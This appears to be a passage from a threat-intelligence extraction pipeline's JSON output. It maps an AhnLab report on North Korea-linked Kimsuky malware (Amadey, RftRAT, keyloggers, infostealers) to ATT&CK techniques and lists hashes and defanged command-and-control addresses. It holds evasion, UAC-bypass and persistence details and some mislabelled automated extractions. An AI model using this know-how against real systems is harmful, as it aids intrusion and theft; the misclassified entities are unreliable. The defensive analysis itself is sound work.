            "indicators": [],
            "tools": [
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "bc33acc3-2301-4d45-bdf1-6d8b5b7cc00b",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Remote Desktop Protocol",
            "attack_id": "T1021.001",
            "tactic": "Lateral Movement",
            "description": "Detected Remote Desktop Protocol activity via NLP pattern matching",
            "confidence_score": 0.623,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.5,
              "description_detail": 0.199,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "680cd5d3-7ff2-4396-a2be-b2b267e46639",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "User Execution: Malicious File",
            "attack_id": "T1204.002",
            "tactic": "Execution",
            "description": "Detected User Execution: Malicious File activity via NLP pattern matching",
            "confidence_score": 0.621,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.5,
              "description_detail": 0.185,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "nlp_indicator"
          }
        ],
        "nlp_analysis": {
          "processed_text": {
            "cleaned_text": "1 / 2 0 By Sanseo December 8  2023 Kimsuky Group Uses AutoIt to Create Malware (RftRAT  Amadey) asec.ahnlab.com/en/59590 Overview Initial Access  . 2.1. Spear Phishing Attack  . 2.2. LNK Malware Remote Control Malware  . 3.1. XRat (Loader)  . 3.2. Amadey  . 3.3. Latest Attack Cases   .. 3.3.1. AutoIt Amadey   .. 3.3.2. RftRAT Post-infection  . 4.1. Keylogger  . 4.2. Infostealer  . 4.3. Other Types Conclusion 1. Overview The Kimsuky threat group  deemed to be supported by North Korea  has been active since 2013. At first  they attacked North Korea-related research institutes in South Korea before attacking a South Korean energy corporation in 2014. Cases of attacks against countries other than South Korea have also been identified since 2017. [1] The group usually employs spear phishing attacks against the national defense sector  defense industries  the press  the diplomatic sector  national organizations  and academic fields to steal internal information and technology from organizations. [2] (This link is only available in Korean.) Even until recently  the Kimsuky group was still mainly employing spear phishing attacks to gain initial access. What makes the recent attacks different from the previous cases is that more LNK shortcut-type malware are being used instead of malware in Hangul Word Processor (HWP) or MS Office document format. The threat actor led users to download a compressed file through attachments or download links within spear phishing emails. When this compressed file is decompressed  it yields a legitimate document file along with a malicious LNK file. ASEC is monitoring the Kimsuky group s attacks using LNK-type malware and is continuously posting identified cases of attacks on the ASEC Blog. The Kimsuky group installs remote control malware to control the infected system after completing such steps to 2 / 2 0 gain initial access. Malware used by the Kimsuky group not only include custom-made such as AppleSeed and PebbleDash [3]  but also open-source or commercial malware such as XRat [4]  HVNC [5]  Amadey [6]  and Metasploit Meterpreter [7]. After gaining control  the threat actor ultimately uses RDP or installs Google s Chrome Remote Desktop [8] to exfiltrate information from the infected system. Here we analyze Amadey and RftRAT which were recently found being distributed. Amadey and RftRAT were constantly used throughout 2023 alongside XRat. However  recent types showed that they were created with AutoIt. This post also covers Infostealers additionally installed by the Kimsuky group using remote control malware. While remote control-type malware continuously change  the malware installed through these have not changed much in the attacks in 2023. 2. Initial Access 2.1. Spear Phishing Attack In the year 2023  ASEC covered cases of LNK malware distribution in posts such as  Malicious LNK File Disguised as a Normal HWP Document  [9]   Malicious LNK File Being Distributed  Impersonating the National Tax Service  [10]  and  Distribution of Malicious LNK File Disguised as Producing Corporate Promotional Materials  [11]. By attaching files or including download links in the emails  the threat actor prompted users to download the compressed file and execute the LNK shortcut file inside. 3 / 2 0 Figure 1. LNK malware included in compressed files 2.2. LNK Malware The LNK file contains an encrypted compressed file  which in turn holds various malware in script format. 4 / 2 0 Figure 2. Malware in script format contained within LNK files Executing the LNK file decompresses the file  and ultimately  the script malware is run. The BAT and VBS scripts inside can either be used for executing other scripts or contain an Infostealer responsible for collecting and exfiltrating information from the infected system. There is also a script for maintaining persistence as well as a downloader that downloads and executes additional payloads from an external source. As such  malware in script format that run in infected systems install additional malware from an external source  major examples of which are backdoors called XRat  Amadey  and RftRAT. While these malware are all packed with VMP when in distribution  recently  Amadey and RftRAT variants created with AutoIt have been used. After a remote control malware is installed  keyloggers and Infostealers are installed to steal internal information and technology from the organizations. 3. Remote Control Malware 3.1. XRat (QuasarRAT) XRat is a RAT malware developed in .NET and was created based on QuasarRAT published on GitHub. It was confirmed that the Kimsuky group was using XRat from a much earlier point in time. Recently  instead of in independent executable or DLL file formats  this is being used in attacks as an encrypted payload. It consists of the file  ht.dll  which is the loader  the data file  htsetting.ini  holding the configuration data  and an encrypted payload. This method seems to be for the purpose of bypassing security products. 5 / 2 0 The loader reads  decrypts  and injects the htsetting.ini file located in the same path. All ht.dll loaders identified so far were packed with VMP  and the decrypted binary contained the following strings used by the threat actor. Figure 3. Loader ht.dll packed with VMP The configuration file contains the name of the actual encrypted malware  the RC4 decryption key  and information on the legitimate file to inject into. Ht.dll references this information to read and decrypt the encrypted file before injecting it into a legitimate process. The payload that is injected and run in the end can be another malware besides XRat  depending on the encrypted file. 3.2. Amadey The Kimsuky group also used Amadey Bot in their attacks. Amadey is a malware that began being sold on illegal forums. It is a downloader that installs additional malware from the C C server. Besides such downloader features  it can also transmit basic information about the system or exfiltrate screenshots and account credentials saved in web browsers and email clients depending on the settings or whether certain plugins are installed. The Kimsuky group uses a dropper to install Amadey. This dropper  in DLL format  creates a randomly named hidden folder in the  PUBLIC  path where it drops the files it holds. The compressed file containing the actual Amadey is among the created files  and examining the compression size shows this file to be large  exceeding 300 MB. This is also presumed to be an attempt to evade security products by intentionally increasing the size. 6 / 2 0 Figure 4. Amadey-related files created in the Public path Afterward  it creates the path   ALLUSERSPROFILE \\Startup  and registers it to the Startup folder. Here  a script named  svc.vbs  is created  which is responsible for maintaining persistence. Amadey  which is loaded and executed through the Rundll32.exe process  goes through svchost.exe before being injected into the iexplore.exe process and run. Figure 5. The infected system s information transmitted to the C C server Even in 2023  the threat actor installed Amadey in many of their attacks  and in most instances  it was installed by the same type of dropper. Said dropper also included RftRAT besides Amadey. RftRAT  like Amadey  also has a file size exceeding 300 MB. The RftRAT instances identified in these attacks were all packed with VMP like Amadey and were found to contain the keyword  RFTServer  in the decrypted strings. RftRAT is a backdoor that can receive commands from the C C server and execute them. 7 / 2 0 Figure 6. Decrypted strings in RftRAT 3.3. Latest Attack Cases It was recently identified that the Kimsuky group has been using AutoIt to create malware. The Kimsuky group ported Amadey which had been used from the past to AutoIt and also used it for the purpose of injecting RftRAT. In past attack cases  only the debug string RFTServer was found  but in recent attacks  a malware containing a PDB path was found. The string within the PDB path shows that the threat actor named this malware  rft  as a RAT type. Accordingly  said malware is categorized as  RftRAT  here. Figure 7. RftRAT s PDB information PDB String: E:_WORK\\My_Work\\Exploit\\Spyware_spy\\RAT\\RFT_Socket_V3.2\\Release\\rft.pdb 3.3.1. AUTOIT AMADEY As covered above  Amadey is one of the malware that has been constantly used by the Kimsuky group. The version of Amadey used by the Kimsuky group is different from the type used by other threat actors: Kimsuky group s Amadey uses Domain Generation Algorithms 8 / 2 0 (DGA)  and when it scans for antivirus software installed in the infected system  it also searches for product names from South Korean companies. The recently identified Amadey is ported into the AutoIt language and has the same format as the types identified in the past attack cases. The threat actor installed both a legitimate AutoIt executable file and a compiled AutoIt script in the infected system. The compiled AutoIt script is 100 MB in size for the purpose of hindering analysis and contains dummy data as shown below. Figure 8. The compiled AutoIt script file used in the attacks Although written in a different language  the decrypted AutoIt script can be considered to be the Amadey malware. The HTTP request structure for sending the system information collected from the infected system to the C C server is identical to that of the typical Amadey. Figure 9. The structure of the HTTP packet that Amadey sends to the C C server Besides this  it also has a routine for checking for products from South Korean companies when retrieving the list of antivirus products installed in the infected system. Furthermore  it supports the feature to download additional payloads in not only an exe format  but also dll  PowerShell  vbs  and js formats. 9 / 2 0 Figure 10. The script where Amadey s routine is implemented As mentioned above  the Amadey used by the Kimsuky group supports DGA. DGA  also known as Domain Generation Algorithm  dynamically generates a domain (C C server address) instead of a fixed form. After dynamically obtaining the C C server address based on the date  the Kimsuky group used this as a subsidiary C C server. When the connection to the C C server was down  the subsidiary C C server generated through DGA was used for communication. Figure 11. Amadey s DGA 3.3.2. RFTRAT 1 0 / 2 0 The AutoIt scripts used in the attacks include Amadey and RftRAT. The AutoIt executable file and the malicious AutoIt script are also created through a dropper. The following ASD log shows the execution log of  d015700.dll   which is the dropper that installs RftRAT  and the log showing RftRAT ultimately creating an Infostealer after being injected into svchost.exe. Additionally  AppleSeed  another malware used by the Kimsuky group  was additionally installed in the same system afterward. Figure 12. Kimsuky group s attack log The RftRAT used in previous attacks is in DLL format and packed in VMP  so an exact comparison is difficult. However  it was categorized into the past version of RftRAT due to the fact that the same library file is used  that ICMLuaUtil is used to bypass UAC  and that the path names used for saving C C communication and command results are almost the same. 1 1 / 2 0 Figure 13. Strings in a past version of RftRAT similar to the latest version The compiled AutoIt script is similar to the Amadey in the case above  but it is actually an injector that executes svchost.exe and injects RftRAT into it. The ultimate payload RftRAT cannot be executed independently. Data must be read in from a mapped file named  A1CCA2EC-C09F-D33C-4317-7F71F0E2A976_0 . The injector AutoIt script writes the paths of the AutoIt executable file and script into this file. Figure 14. The paths of AutoIt-related files transmitted through a file mapping process 1 2 / 2 0 The transmitted paths of the AutoIt executable file and script are used later on in the UAC bypassing stage. RftRAT uses the ICMLuaUtil interface of the CMSTPLUACOM component to bypass UAC and execute itself as administrator. After being run as administrator  RftRAT collects basic information about the infected system and sends it to the C C server. Offset Data 0x0000Signature (0x963DA7EF) 0x0004Infected system s ID 0x0044IP address 0x014 Computer name Table 1. Data delivered to the C C server Figure 15. The packet used for communication with the C C server Afterward  it receives commands from the C C server. RftRAT writes the received commands to the path   APPDATA \\asc\\t1.pb  before decrypting them. Decryption yields the actual commands  which are written to the same file and reread to be executed. The command  the execution results  and the additionally downloaded file are created in the paths below. 1 3 / 2 0 Path Description  APPDATA \\asc\\t1.pbCommand downloaded from the C C server  APPDATA \\asc\\t2.axCommand execution results  APPDATA \\asc\\t3.brFile downloaded through the download command Table 2. Files generated during the C C communication and command processes CommandDescription 0x00 Download file 0x01 Upload file (zip compressed) 0x02 Look up driver information 0x04 Change file name 0x05 Create directory 0x06 Delete file 0x07 Execute file (with UAC Bypass) 0x08 Look up process information 0x09 Terminate process 0x0A Reverse shell 0x0B Terminate process and delete file 0x12 Terminate 0x14 Wait Table 3. RftRAT s commands 4. Post-infection After taking control of the infected system  to exfiltrate information  the Kimsuky group installs various malware such as keyloggers and tools for extracting accounts and cookies from web browsers. The group also installs Mimikatz and RDP Wrapper  which have both been steadily used for many years. 4.1. Keylogger 1 4 / 2 0 The keylogger is usually installed in the path   ALLUSERSPROFILE \\startup\\NsiService.exe . It persists in the system and monitors key input from the user  which is saved in the path   ALLUSERSPROFILE \\semantec\\av\\C_1025.nls  or   ALLUSERSPROFILE \\Ahn\\av\\C_1025.nls . Additionally    ALLUSERSPROFILE \\semantec  is a folder where the keylogger is installed  along with various malware covered in this article. 4.2. Infostealer Malware for collecting information from web browsers were created in the   ALLUSERSPROFILE \\semantec\\  path under the names  GBIA.exe    GBIC.exe    GBS.exe   and  GPIA.dll . While most target account credentials and cookies saved in web browsers  there are types that collect files in the  Local Extension Settings  path  which is the configuration data related to Chrome extensions. Figure 16. Stealing account credentials from a web browser Besides these  the tool named  GPIA.exe  looks up all paths in the infected system and displays the files in each folder. Because the file containing the paths of all files is naturally large  it also allows this file to be split-compressed. 1 5 / 2 0 Figure 17. System path lookup tool 4.3. Other Types A notable fact about the Kimsuky group is that it often abuses RDP for information theft. Accordingly  it either installs RDP Wrapper or uses a patcher malware for multiple sessions. Recently  there was a discovery of a malware that monitors the login records of the user. This seems to be for the purpose of finding out when the user logs in to use RDP to connect during idle times. The file  taskhosts.exe  installed in the path   ALLUSERSPROFILE \\semantec\\  is an injector that injects  ipcheck.dll  into the  explorer.exe  and  runtimebroker.exe  processes.  ipcheck.dll  monitors the user s log-on/log-off activities by hooking the  WinStationQueryInformationW()  and  ExitWindowsEx()  functions and the log is saved in the path   PUBLIC \\Log64.txt . 1 6 / 2 0 Figure 18. Log-on and log-off records saved in the log file The threat actor also used proxy malware. Proxy tools in the past were run by receiving command line arguments  but the type used by Kimsuky reads and uses a configuration file named  setting.ini . The port number 3389 configured in the default address indicates that it is likely to establish an RDP connection to a private network. Figure 19. Proxy malware 5. Conclusion 1 7 / 2 0 The Kimsuky threat group is continuously launching spear phishing attacks against South Korean users. Recently  malicious LNK files have been distributed to South Korean users with various topics  so users are advised to practice particular caution. The group usually employs the method of distributing malware through attachments or download links in emails. When a user executes them  the threat actor may be able to take control of the system that is currently in use. The Kimsuky group has been newly creating and using various malware to control infected systems and steal information. Recently  the group has been using AutoIt to create malware to bypass security products. Users must carefully check the senders of emails and refrain from opening files from unknown sources. It is also recommended to apply the latest patch for OS and programs such as Internet browsers and update V3 to the latest version to prevent such malware infection in advance. File Detection   Downloader/Win.Amadey.R626032 (2023.11.30.00)   Backdoor/Win.Agent.R626033 (2023.11.30.00)   Downloader/Win.Amadey.C5462118 (2023.07.28.03)   Trojan/AU3.Loader (2023.11.22.01)   Dropper/Win.Agent.C5542993 (2023.11.17.02)   Trojan/Win.Agent.C5430096 (2023.05.20.00)   Infostealer/Win.Agent.R622445 (2023.11.17.02)   Downloader/Win.Amadey.C5479015 (2023.08.31.01)   Trojan/Win.Agent.C5485099 (2023.09.11.03)   Trojan/Win.Agent.C5479017 (2023.08.31.01)   Trojan/Win.Loader.C5479014 (2023.08.31.01)   Trojan/Win.Agent.C5465186 (2023.11.30.00)   Infostealer/Win.Agent.C5542999 (2023.11.17.02)   Infostealer/Win.Agent.C5542997 (2023.11.17.02)   Trojan/Win.Agent.C5451959 (2023.11.30.00)   Trojan/Win.Agent.Prevention.C5446554 (2023.11.30.00)   Trojan/Win.Agent.R589022 (2023.06.28.02)   Trojan/Win.Loader.R588248 (2023.11.30.00)   Trojan/Win.Agent.C5444839 (2023.11.30.00)   Trojan/Win.Stealer.C5441397 (2023.11.30.00)   Trojan/Win.KeyLogger.C5430090 (2023.05.20.00)   Malware/Win.Generic.C5430065 (2023.11.30.00)   Trojan/Win.Stealer.R579484 (2023.05.20.00)   Trojan/Win.Loader.C5430091 (2023.05.20.00)   Trojan/Win.KeyLogger.C5430092 (2023.05.20.00) 1 8 / 2 0   Trojan/Win.Loader.C5430099 (2023.05.20.00)   Trojan/Win.Proxy.C5430093 (2023.05.20.00)   Trojan/Win.Agent.C5430095 (2023.05.20.00) Behavior Detection   Persistence/MDP.AutoIt.M4766   Injection/MDP.Hollowing.M4767 IOC MD5   f5ea621f482f9ac127e8f7b784733514 : RftRAT Dropper   AutoIt (d009086.dll)   7b6471f4430c2d6907ce4d349f59e69f : Amadey   AutoIt Script (adal.au3)   14a7f83d6215a4d4c426ad371e0810a2 : RftRAT   AutoIt Script (run.au3)   74d5dac64c0740d3ff5a9e3aca51ccdf : RftRAT   AutoIt Script (chkdisc.au3)   a7c9b4d70e4fad86598de37d7bf1fe96 : RftRAT   AutoIt Script (run.au3)   32696d9e1e72affaf8bc707ab271200d : Loader (ht.dll)   4b667f7ea5bdc9d872774f733fdf4d6a : Loader (ht.dll)   7f582f0c5c9a14c736927d4dbb47c5fa : Loader (ht.dll)   94aef716b23e8fa96808f1096724f77f : Loader (ht.dll)   0786984ab46482637c2d483ffbaf66dc : Loader (ht.dll)   1f63ce3677253636a273a88c5b26418d : Loader (ht.dll)   6f7cd8c0d9bfb0f97083e4431e4944c1 : Amadey Dropper (10.dll)   4fc726ab835ce559bada42e695b3d341 : Amadey Dropper (11.dll)   0fc1c99fd0d6f5488ab77e296216c7c6 : Amadey Dropper (10.dll)   f9c4d236b893c0d72321a9210359f530 : Amadey (svc4615.dll)   e22336eaf1980d2be5feed61b2dbc839 : Amadey (svc7014.dll)   862a855557cc274ab86e226e45338cff : Amadey (mtms2883.dll)   0f5762be09db44b2f0ccf05822c8531a : Amadey (ad53.dat)   c87094e261860e3a1f70b0681e1bc8c5 : Amadey (ad54.dat)   bac7f5eefe6a67e9555e93b0d950db59 : Amadey (d021999.dll)   c5a1305aba22c8fedd6624753849905b : Amadey (mtms02.dat)   068d395c60e32f01b5424e2a8591ba73 : Amadey (adal66.dat)   f3caa0f922600b4423ebcb16d7ea2dc6 : RftRAT Dropper (_e2.dll)   355817015c8510564c6ac89c976f2416 : RftRAT Dropper (_d2.dll)   d541aa6bae0f8c9bd7e7b6193b52e8f2 : RftRAT Dropper (d010943.dll)   093608a2d6eb098eb7ea917cc22e9998 : RftRAT Dropper (30.dll)   f76cde928a6eda27793ade673bcd6620 : RftRAT (msc1439.dll)   aaa42b1209ed54bfcbd2493fe073d59b : RftRAT (mtms1929.dll)   1003a440c710ddf7faa1a54919dd01d8 : RftRAT (rtm8668.dll)   b67e6e4c16e0309cfc2511414915df15 : RftRAT (cmms1106.dll)   4d4d485d3bfd3cbc97ed4b9a671f740f : RftRAT (cmms2366.dll)   cf3440fa165e3f78d2a2252a6924f702 : RftRAT (mtms7794.dll) 1 9 / 2 0   c55da826e50e2615903607e61968778f : RftRAT   d070cf19b66da341f64c01f8195afaed : RftRAT (r2.dat)   e665a985f71567f24a293ea430aad67d : RftRAT (r2.dat)   c52410ed6787c39db87c4158e73089d4 : RftRAT (r1.dat)   1ac0b0da11e413a21bec08713e1e7c59 : RftRAT (40.dat)   39e755c08156123e4cabac6bf8d1fd3a : RftRAT (a2.dat)   187aa9b12c05cd1ff030044786903e7e : KeyLogger (NsiService.exe)   b1337eb53b21594ac5dbd76138054ffb : KeyLogger (NsiService.exe)   d820ddb3026a5960b2c6f39780480d28 : KeyLogger (NsiService.exe)   5c2809177bb95edc68f9a08a96420bb7 : Stealer   Web browser (GBIA.exe)   0bf558adde774215bb221465a4edd2fe : Stealer   Web browser (GBIA.exe)   aa2cf925bae24c5cad2b1e1ad745b881 : Stealer   Web browser (GPIA.dll)   baa058003bf79ba82ac1b744ed8d58cb : Stealer   Chrome extension (GBS.exe)   38182f1f0a1cf598295cfbbabd9c5bf4 : Stealer   File path (GPIA.exe)   272c29bf65680b1ac8ec7f518780ba92 : Stealer   File path (GPIA.exe)   e860dac57933f63be9a374fb78bca209 : Proxy (svc.exe)   e96ca2aa7c6951802e4b17649cc5b581 : Injector (taskhosts.exe)   4eddf54757ae168450882176243d2bd2 : Injector (sihosts.exe)   119063c82373598d00d17734dd280016 : LogonMon (ipcheck.dll) C C   hxxps://prohomepage[.]net/index.php :Amadey   AutoIt Script   45.76.93[.]204:56001 : RftRAT   AutoIt Script   91.202.5[.]80:52030 : RftRAT   AutoIt Script   192.236.154[.]125:50108 : RftRAT   AutoIt Script   hxxp://brhosting[.]net/index.php : Amadey   hxxps://topspace[.]org/index.php : Amadey   hxxps://theservicellc[.]com/index.php : Amadey   hxxps://splitbusiness[.]com/index.php : Amadey   hxxps://techgolfs[.]com/index.php : Amadey   23.236.181[.]108:52390 : RftRAT   152.89.247[.]57:52390 : RftRAT   172.93.201[.]248:8083 : RftRAT   172.93.201[.]248:52390 : RftRAT   209.127.37[.]40:52390 : RftRAT Subscribe to AhnLab s next-generation threat intelligence platform  AhnLab TIP  to check related IOC and detailed analysis information. Categories:Malware Information Tagged as:Amadey Kimsuky RftRAT xRAT 2 0 / 2 0",
            "commands": [],
            "file_paths": [
              "/techgolfs[.]com/index.php",
              "/brhosting[.]net/index.php",
              "/Win.Generic.C5430065",
              "/splitbusiness[.]com/index.php",
              "/Win.Agent.R626033",
              "/Win.Agent.C5430095",
              "/Win.Agent.C5430096",
              "/prohomepage[.]net/index.php",
              "/",
              "/Win.Agent.C5485099",
              "/Win.KeyLogger.C5430090",
              "/MDP.AutoIt.M4766",
              "/topspace[.]org/index.php",
              "/Win.Agent.C5479017",
              "/MDP.Hollowing.M4767",
              "/Win.Stealer.R579484",
              "/Win.Agent.C5451959",
              "/Win.KeyLogger.C5430092",
              "/Win.Agent.C5542999",
              "/theservicellc[.]com/index.php",
              "/Win.Amadey.C5479015",
              "/Win.Loader.R588248",
              "/Win.Amadey.R626032",
              "/Win.Agent.R589022",
              "/Win.Stealer.C5441397",
              "/Win.Agent.Prevention.C5446554",
              "/Win.Proxy.C5430093",
              "/Win.Agent.C5465186",
              "/Win.Agent.C5444839",
              "/Win.Loader.C5430099",
              "/Win.Loader.C5479014",
              "/Win.Agent.C5542993",
              "/Win.Agent.C5542997",
              "/AU3.Loader",
              "/Win.Amadey.C5462118",
              "/Win.Loader.C5430091",
              "/Win.Agent.R622445"
            ],
            "registry_keys": []
          },
          "entities": {
            "malware": [
              "Keylogger",
              "Loader",
              "Malware",
              "Metasploit",
              "Mimikatz",
              "RAT",
              "Trojan",
              "backdoor",
              "conti",
              "downloader",
              "dropper",
              "payload"
            ],
            "tools": [
              "Metasploit",
              "Mimikatz",
              "NET",
              "PowerShell",
              "Rundll32",
              "at",
              "ping",
              "reg",
              "sc"
            ],
            "threat_actors": [],
            "ips": [],
            "domains": [
              "10.dll",
              "11.dll",
              "30.dll",
              "40.dat",
              "AU3.Loader",
              "GBIA.exe",
              "GBIC.exe",
              "GBS.exe",
              "GPIA.dll",
              "GPIA.exe",
              "Ht.dll",
              "Log64.txt",
              "MDP.AutoIt",
              "MDP.Hollowing",
              "NsiService.exe",
              "Rundll32.exe",
              "Win.Agent",
              "Win.Agent.Prevention",
              "Win.Amadey",
              "Win.Generic",
              "Win.KeyLogger",
              "Win.Loader",
              "Win.Proxy",
              "Win.Stealer",
              "a2.dat",
              "ad53.dat",
              "ad54.dat",
              "adal66.dat",
              "asec.ahnlab.com",
              "cmms1106.dll",
              "cmms2366.dll",
              "d009086.dll",
              "d010943.dll",
              "d015700.dll",
              "d021999.dll",
              "explorer.exe",
              "ht.dll",
              "htsetting.ini",
              "iexplore.exe",
              "index.php",
              "ipcheck.dll",
              "msc1439.dll",
              "mtms02.dat",
              "mtms1929.dll",
              "mtms2883.dll",
              "mtms7794.dll",
              "r1.dat",
              "r2.dat",
              "rft.pdb",
              "rtm8668.dll",
              "runtimebroker.exe",
              "setting.ini",
              "sihosts.exe",
              "svc.exe",
              "svc.vbs",
              "svc4615.dll",
              "svc7014.dll",
              "svchost.exe",
              "t1.pb",
              "t1.pbCommand",
              "t2.axCommand",
              "t3.brFile",
              "taskhosts.exe"
            ],
            "hashes": {
              "md5": [
                "068d395c60e32f01b5424e2a8591ba73",
                "0786984ab46482637c2d483ffbaf66dc",
                "093608a2d6eb098eb7ea917cc22e9998",
                "0bf558adde774215bb221465a4edd2fe",
                "0f5762be09db44b2f0ccf05822c8531a"
              ]
            }
          },
          "ttp_indicators": {
            "initial_access": [
              "Phishing",
              "Exploit Public-Facing Application"
            ],
            "execution": [
              "PowerShell",
              "User Execution: Malicious File"
            ],
            "persistence": [
              "Create or Modify System Process"
            ],
            "defense_evasion": [
              "Process Injection"
            ],
            "credential_access": [
              "OS Credential Dumping",
              "Input Capture"
            ],
            "lateral_movement": [
              "Remote Desktop Protocol"
            ],
            "collection": [
              "Archive Collected Data",
              "Screen Capture"
            ],
            "exfiltration": [
              "Exfiltration Over C2 Channel"
            ],
            "command_and_control": [
              "Application Layer Protocol"
            ]
          },
          "context": "\n**File System Activity:**\n- /techgolfs[.]com/index.php\n- /brhosting[.]net/index.php\n- /Win.Generic.C5430065\n- /splitbusiness[.]com/index.php\n- /Win.Agent.R626033\n\n**Network Indicators:**\n- MDP.AutoIt\n- r2.dat\n- svc.exe\n- ad54.dat\n- t2.axCommand\n- taskhosts.exe\n- index.php\n- d009086.dll\n- iexplore.exe\n- Win.Agent.Prevention\n\n**Key Security Terms:** establish, upload, payload, extract, task, persistence, execute, download, backdoor, terminate"
        },
        "metadata": {
          "extraction_method": "LangChain-Enhanced",
          "nlp_processing_time_ms": 18.663,
          "llm_processing_time_ms": 6714.3730000000005
        }
      }
    ],
    "results": [
      {
        "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
        "extracted_ttps": [
          {
            "ttp_id": "fc54a1e5-59af-4588-901b-3997e5a3bba4",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Remote Control Malware",
            "attack_id": "T1219",
            "tactic": "Persistence",
            "description": "The Kimsuky group installs remote control malware to control the infected system after completing initial access steps. Malware used by the Kimsuky group includes custom-made malware such as AppleSeed and PebbleDash, as well as open-source or commercial malware such as XRat, HVNC, Amadey, and Metasploit Meterpreter.",
            "confidence_score": 0.809,
            "confidence_level": "high",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.7,
              "description_detail": 0.668,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.5
            },
            "indicators": [
              "remote control malware",
              "XRat",
              "HVNC",
              "Amadey",
              "Metasploit Meterpreter"
            ],
            "tools": [
              "Amadey",
              "at",
              "metasploit",
              "rundll32",
              "Rundll32",
              "Metasploit",
              "sc",
              "zip",
              "HVNC",
              "XRat",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit Meterpreter"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "7a75405c-9f97-43b1-84ad-591b938f9a49",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Spear Phishing Attack",
            "attack_id": "T1566",
            "tactic": "Initial Access",
            "description": "The Kimsuky group employs spear phishing attacks against the national defense sector, defense industries, the press, the diplomatic sector, national organizations, and academic fields to steal internal information and technology from organizations.",
            "confidence_score": 0.78,
            "confidence_level": "high",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.62,
              "description_detail": 0.556,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.5
            },
            "indicators": [
              "spear phishing emails",
              "LNK shortcut-type malware",
              "compressed files"
            ],
            "tools": [
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "c1716a04-7cb9-439f-ad50-82e61db3c199",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "LNK Malware",
            "attack_id": "T1204",
            "tactic": "Execution",
            "description": "The LNK file contains an encrypted compressed file, which in turn holds various malware in script format. Executing the LNK file decompresses the file, and ultimately, the script malware is run.",
            "confidence_score": 0.779,
            "confidence_level": "high",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.62,
              "description_detail": 0.548,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.5
            },
            "indicators": [
              "LNK files",
              "encrypted compressed files",
              "script malware"
            ],
            "tools": [
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "LNK malware",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "d381f505-4a3f-4776-acb7-cbceff5956bd",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Persistence",
            "attack_id": "T1050",
            "tactic": "Persistence",
            "description": "There is also a script for maintaining persistence as well as a downloader that downloads and executes additional payloads from an external source.",
            "confidence_score": 0.764,
            "confidence_level": "high",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.484,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.5
            },
            "indicators": [
              "persistence script",
              "downloader"
            ],
            "tools": [
              "rundll32",
              "at",
              "metasploit",
              "persistence script",
              "Rundll32",
              "zip",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "downloader",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "13b36b22-f66c-4121-b8c1-721cc1be5746",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Proxy",
            "attack_id": "T1090",
            "tactic": "Command and Control",
            "description": "The threat actor used proxy malware to establish an RDP connection to a private network",
            "confidence_score": 0.749,
            "confidence_level": "very_low",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.62,
              "description_detail": 0.345,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.5
            },
            "indicators": [
              "svc.exe",
              "setting.ini",
              "3389"
            ],
            "tools": [
              "rundll32",
              "at",
